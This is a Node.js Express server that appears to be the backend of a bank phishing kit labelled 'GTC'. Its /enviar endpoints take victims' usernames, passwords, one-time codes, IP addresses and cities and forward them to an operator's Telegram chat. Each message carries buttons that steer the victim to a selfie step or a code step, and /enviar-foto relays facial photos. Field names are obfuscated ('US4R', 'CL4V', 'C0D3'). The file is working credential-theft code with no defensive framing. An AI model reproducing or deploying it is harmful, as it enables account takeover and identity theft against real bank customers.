const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const fileUpload = require('express-fileupload');

app.use(fileUpload({
    limits: { fileSize: 10 * 1024 * 1024 }, // límite 10MB
    abortOnLimit: true,
}));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 15 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// Endpoint para /enviar (GTC)
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});


app.post('/enviar2', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>

🔐 C0D3: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});


app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>

🔐 RE-C0D3: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

app.post('/enviar-foto', async (req, res) => {
    try {
        const photo = req.files?.photo;
        const caption = req.body.caption || 'Foto facial';

        if (!photo) {
            console.log('❌ No se recibió archivo photo en req.files');
            return res.status(400).send('No se recibió la foto');
        }

        console.log('✅ Foto recibida:', photo.name, 'Tamaño:', photo.size, 'bytes');

        // Convertir el buffer a Blob-like para Telegram
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        formData.append('photo', photo.data, {
            filename: photo.name || 'selfie.jpg',
            contentType: photo.mimetype || 'image/jpeg'
        });

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Foto enviada correctamente a Telegram');
        } else {
            console.log('❌ Error de Telegram:', result);
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('🔥 Error crítico en /enviar-foto:', error);
        res.sendStatus(500);
    }
});



// Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor activo en Render puerto ${PORT}`);
  console.log('TELEGRAM_TOKEN configurado:', !!TELEGRAM_TOKEN);
  console.log('CHAT_ID configurado:', !!CHAT_ID);
});
